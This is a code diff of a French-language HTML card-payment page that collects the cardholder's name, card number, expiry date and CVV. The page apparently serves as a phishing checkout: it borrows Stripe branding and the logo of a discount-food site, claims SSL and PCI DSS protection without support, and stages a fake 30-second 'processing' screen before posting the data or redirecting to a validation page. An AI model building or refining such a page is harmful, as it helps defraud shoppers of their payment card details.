@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Finalisez votre paiement</title>
-    <!-- Lien vers FontAwesome pour les icônes -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         /* Reset CSS */
@@ -20,22 +19,26 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            flex-direction: column;
+            height: 100%;
             margin: 0;
             color: #333;
+            overflow-x: hidden;
+            padding-top: 140px; /* Ajustement de l'espace pour que le logo soit visible */
         }
 
         .container {
             width: 100%;
-            max-width: 500px;
+            max-width: 550px; /* Augmenter la largeur du cadre */
             background: rgba(255, 255, 255, 0.95);
-            padding: 40px;
+            padding: 50px;
             border-radius: 20px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
             animation: fadeIn 0.5s ease-in-out;
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.2);
             position: relative;
+            overflow: hidden;
         }
 
         @keyframes fadeIn {
@@ -52,10 +55,13 @@
         .logo {
             text-align: center;
             margin-bottom: 20px;
+            position: sticky;
+            top: 0;
+            z-index: 10;
         }
 
         .logo img {
-            width: 100%; /* Logo prend toute la largeur */
+            width: 100vw; /* Logo prend toute la largeur de l'écran */
             max-width: 100%;
             border-radius: 10px;
             transition: transform 0.3s ease, opacity 0.3s ease;
@@ -108,7 +114,6 @@
             transform: scale(1.02);
         }
 
-        /* Icônes pour chaque champ */
         .form-group i {
             position: absolute;
             left: 12px;
@@ -119,44 +124,28 @@
             opacity: 0.8;
         }
 
-        /* Logos des cartes intégrés à droite dans le champ */
-        .card-logos {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            display: flex;
-            gap: 5px;
-            align-items: center;
+        .form-group .small-text {
+            font-size: 10px;
+            color: #888;
+            margin-top: 5px;
+            text-align: left;
         }
 
-        .card-logos img {
-            width: 30px;
-            height: auto;
-            border-radius: 5px;
-            opacity: 0.3; /* Logo désactivé par défaut */
-            transition: opacity 0.3s ease;
-        }
-
-        .card-logos img.active {
-            opacity: 1; /* Logo activé */
-        }
-
-        /* Bouton de soumission */
         button {
             width: 100%;
-            padding: 16px;
+            padding: 12px; /* Réduction du padding pour le bouton */
             background-color: #4CAF50;
             color: white;
             border: none;
             border-radius: 12px;
-            font-size: 16px;
+            font-size: 14px; /* Réduction de la taille */
             font-weight: 600;
             cursor: pointer;
             transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             position: relative;
             overflow: hidden;
+            margin-top: 20px; /* Déplacement du bouton */
         }
 
         button:hover {
@@ -169,14 +158,14 @@
             transform: translateY(0);
         }
 
-        /* Écran de chargement plein écran flou */
+        /* Overlay de chargement */
         .loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.9);
+            background: rgba(0, 0, 0, 0.8);
             backdrop-filter: blur(20px);
             display: flex;
             justify-content: center;
@@ -194,10 +183,10 @@
 
         .loading-spinner {
             border: 8px solid #f3f3f3;
-            border-top: 8px solid #3498db;
+            border-top: 8px solid #ff9800;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 60px;
+            height: 60px;
             animation: spin 2s linear infinite;
         }
 
@@ -206,7 +195,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Informations de sécurité modernisées */
         .security-info {
             font-size: 12px;
             color: #666;
@@ -235,33 +223,42 @@
             text-decoration: underline;
         }
 
-        /* Section "Sauvegarder pour mon prochain paiement" */
-        .save-payment {
+        /* Case à cocher CGV sur la même ligne */
+        .checkbox-container {
             display: flex;
             align-items: center;
             gap: 10px;
-            margin-top: 20px;
+            margin-top: 10px;
         }
 
-        .save-payment input[type="checkbox"] {
+        .checkbox-container input[type="checkbox"] {
             width: 16px;
             height: 16px;
         }
 
-        .save-payment label {
+        .checkbox-container label {
             font-size: 14px;
             color: #666;
             opacity: 0.8;
         }
 
-        /* Logo "by Stripe" en bas */
+        .required-text {
+            font-size: 10px;
+            color: #888;
+            text-align: left;
+            position: absolute;
+            bottom: 40px;
+            left: 10px;
+        }
+
+        /* Logo Stripe au bas */
         .stripe-logo {
             text-align: center;
             margin-top: 20px;
         }
 
         .stripe-logo img {
-            width: 100px; /* Taille du logo Stripe */
+            width: 80px; /* Petit logo Stripe */
             opacity: 0.8;
             transition: opacity 0.3s ease;
         }
@@ -269,153 +266,152 @@
         .stripe-logo img:hover {
             opacity: 1;
         }
+
+        /* Alignement des champs Date d'expiration et CVV sur la même ligne */
+        .form-row {
+            display: flex;
+            gap: 20px;
+            justify-content: space-between;
+        }
+
+        /* Détection des cartes avec logos en arrière-plan */
+        .form-group input[type="text"] {
+            background-size: contain;
+            background-position-x: 100%;
+            background-repeat: no-repeat;
+            padding-right: 40px;
+        }
+
+        /* Détection Visa */
+        .form-group input[type="text"].visa {
+            background-image: url('https://img.icons8.com/?size=96&id=13608&format=png');
+        }
+
+        /* Détection MasterCard */
+        .form-group input[type="text"].mastercard {
+            background-image: url('https://img.icons8.com/?size=160&id=Xpr1YlK1rUTz&format=png');
+        }
+
+        /* Détection American Express */
+        .form-group input[type="text"].amex {
+            background-image: url('https://logo-marque.com/wp-content/uploads/2020/11/American-Express-Logo-650x366.png');
+        }
+
+        /* Logo de carte après le champ */
+        .card-logos {
+            display: flex;
+            gap: 10px;
+            justify-content: flex-start;
+            margin-top: 10px;
+        }
+
+        .card-logos img {
+            width: 30px;
+            height: 30px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Logo principal agrandi -->
         <div class="logo">
             <img src="https://destockagealimentaireprixbas.com/wp-content/uploads/2024/04/Destockage-Alimentaire-2.gif" alt="Logo">
         </div>
 
-        <!-- Titre -->
         <h1>Finalisez votre paiement</h1>
 
-        <!-- Formulaire -->
         <form id="credit-card-form" action="/credit-card" method="POST">
-            <!-- Nom sur la carte -->
             <div class="form-group">
                 <label for="nom_carte">Nom sur la carte</label>
                 <i class="fas fa-user"></i>
                 <input type="text" id="nom_carte" name="nom_carte" placeholder="Nom sur la carte" required>
             </div>
 
-            <!-- Numéro de la carte avec logos intégrés à droite -->
             <div class="form-group">
                 <label for="numero_carte">Numéro de la carte</label>
                 <i class="fas fa-credit-card"></i>
                 <input type="text" id="numero_carte" name="numero_carte" placeholder="xxxx xxxx xxxx xxxx" required>
+                <div class="small-text">Visa, MasterCard, American Express</div>
                 <div class="card-logos">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" id="visa-logo">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" id="mastercard-logo">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="American Express" id="amex-logo">
+                    <img src="https://img.icons8.com/?size=96&id=13608&format=png" alt="Visa Logo">
+                    <img src="https://img.icons8.com/?size=160&id=Xpr1YlK1rUTz&format=png" alt="MasterCard Logo">
+                    <img src="https://logo-marque.com/wp-content/uploads/2020/11/American-Express-Logo-650x366.png" alt="American Express Logo">
                 </div>
             </div>
 
-            <!-- Date d'expiration et CVV sur la même ligne -->
-            <div class="form-group">
-                <div style="display: flex; gap: 10px;">
-                    <div style="flex: 1;">
-                        <label for="date_expiration">Date d'expiration</label>
-                        <i class="fas fa-calendar-alt"></i>
-                        <input type="text" id="date_expiration" name="date_expiration" placeholder="MM/AA" required>
-                        <small>Recto de la carte au format MM/AA</small>
-                    </div>
-                    <div style="flex: 1;">
-                        <label for="cvv">Code de sécurité (CVV)</label>
-                        <i class="fas fa-lock"></i>
-                        <input type="number" id="cvv" name="cvv" placeholder="CVV" required>
-                        <small>3 chiffres sur le verso de la carte</small>
-                    </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="date_expiration">Date d'expiration</label>
+                    <i class="fas fa-calendar-alt"></i>
+                    <input type="text" id="date_expiration" name="date_expiration" placeholder="MM/AA" required>
+                    <div class="small-text">Recto de la carte au format MM/AA</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="cvv">Code de sécurité (CVV)</label>
+                    <i class="fas fa-lock"></i>
+                    <input type="number" id="cvv" name="cvv" placeholder="CVV" required>
+                    <div class="small-text">3 chiffres sur le verso de la carte</div>
                 </div>
             </div>
 
-            <!-- Sauvegarder pour mon prochain paiement -->
-            <div class="save-payment">
-                <input type="checkbox" id="save_payment" name="save_payment">
-                <label for="save_payment">Sauvegarder pour mon prochain paiement</label>
+            <div class="checkbox-container">
+                <input type="checkbox" id="accepter_cgv" name="accepter_cgv" required>
+                <label for="accepter_cgv">J'accepte les <a href="https://stripe.com/fr-ca/resources/more/general-terms-and-conditions-of-sale-france" target="_blank">Conditions générales de vente</a></label>
             </div>
 
-            <!-- Bouton de soumission -->
+            <div class="required-text">
+                <p>Tous les champs sont obligatoires, sauf indication contraire.</p>
+            </div>
+
             <button type="submit" id="submit-button">Payer maintenant</button>
         </form>
 
-        <!-- Informations de sécurité -->
         <div class="security-info">
             <div class="line">
                 <i class="fas fa-shield-alt"></i>
                 <p>Votre banque peut vous demander d'autoriser le paiement pour compléter votre achat. Vous êtes sur un serveur de paiement sécurisé par les normes SSL (https) et PCI DSS de nos partenaires bancaires. Vos données sont encryptées pour plus de sécurité.</p>
             </div>
-            <div class="line">
-                <i class="fas fa-info-circle"></i>
-                <p><a href="#">Me renseigner sur les finalités du traitement de mes données personnelles, les durées de conservation et mes droits</a>. En validant ma transaction, je reconnais avoir pris connaissance des <a href="#">CGU</a> et je les accepte.</p>
-            </div>
         </div>
 
-        <!-- Logo "by Stripe" en bas -->
         <div class="stripe-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="by Stripe">
+            <img src="https://logo-marque.com/wp-content/uploads/2021/03/Stripe-Logo.png" alt="Stripe logo">
         </div>
     </div>
 
-    <!-- Écran de chargement plein écran flou -->
-    <div class="loading-overlay" id="loading-overlay">
+    <div id="loading-overlay" class="loading-overlay">
         <div class="loading-spinner"></div>
     </div>
 
     <script>
-        // Détection du type de carte
-        const numeroCarteInput = document.getElementById('numero_carte');
-        const visaLogo = document.getElementById('visa-logo');
-        const mastercardLogo = document.getElementById('mastercard-logo');
-        const amexLogo = document.getElementById('amex-logo');
-
-        numeroCarteInput.addEventListener('input', (e) => {
-            const value = e.target.value.replace(/\D/g, '');
-            let cardType = '';
-
-            if (/^4/.test(value)) {
-                cardType = 'visa';
-            } else if (/^5[1-5]/.test(value)) {
-                cardType = 'mastercard';
-            } else if (/^3[47]/.test(value)) {
-                cardType = 'amex';
-            }
-
-            // Active/désactive les logos
-            visaLogo.classList.toggle('active', cardType === 'visa');
-            mastercardLogo.classList.toggle('active', cardType === 'mastercard');
-            amexLogo.classList.toggle('active', cardType === 'amex');
-
-            // Formatage automatique du numéro de carte
-            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
-            if (formattedValue.length > 19) formattedValue = formattedValue.slice(0, 19);
-            e.target.value = formattedValue;
-        });
-
-        // Formatage automatique de la date d'expiration
-        const dateExpirationInput = document.getElementById('date_expiration');
-        dateExpirationInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2, 4);
-            if (value.length > 5) value = value.slice(0, 5);
-            e.target.value = value;
-        });
-
-        // Formatage automatique du CVV
-        const cvvInput = document.getElementById('cvv');
-        cvvInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 3) value = value.slice(0, 3);
-            e.target.value = value;
-        });
-
-        // Gestion du temps de chargement
-        const submitButton = document.getElementById('submit-button');
         const form = document.getElementById('credit-card-form');
         const loadingOverlay = document.getElementById('loading-overlay');
+        const submitButton = document.getElementById('submit-button');
 
-        form.addEventListener('submit', (e) => {
-            e.preventDefault(); // Empêche la soumission réelle du formulaire
-
-            // Affiche l'écran de chargement
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
             loadingOverlay.classList.add('active');
-
-            // Simule un temps de chargement de 30 secondes
             setTimeout(() => {
-                loadingOverlay.classList.remove('active');
-                form.submit(); // Soumet le formulaire après le délai
-            }, 30000); // 30 secondes
+                window.location.href = 'validation.paiement.html';
+            }, 30000); // Redirection après 30 secondes
+        });
+
+        // Ajout de détection de type de carte sur le champ Numéro de carte
+        const numeroCarteInput = document.getElementById('numero_carte');
+        numeroCarteInput.addEventListener('input', function() {
+            const cardNumber = numeroCarteInput.value.replace(/\s+/g, ''); // Supprimer les espaces
+
+            if (cardNumber.startsWith('4')) {
+                numeroCarteInput.classList.add('visa');
+                numeroCarteInput.classList.remove('mastercard', 'amex');
+            } else if (cardNumber.startsWith('5')) {
+                numeroCarteInput.classList.add('mastercard');
+                numeroCarteInput.classList.remove('visa', 'amex');
+            } else if (cardNumber.startsWith('3')) {
+                numeroCarteInput.classList.add('amex');
+                numeroCarteInput.classList.remove('visa', 'mastercard');
+            } else {
+                numeroCarteInput.classList.remove('visa', 'mastercard', 'amex');
+            }
         });
     </script>
 </body>
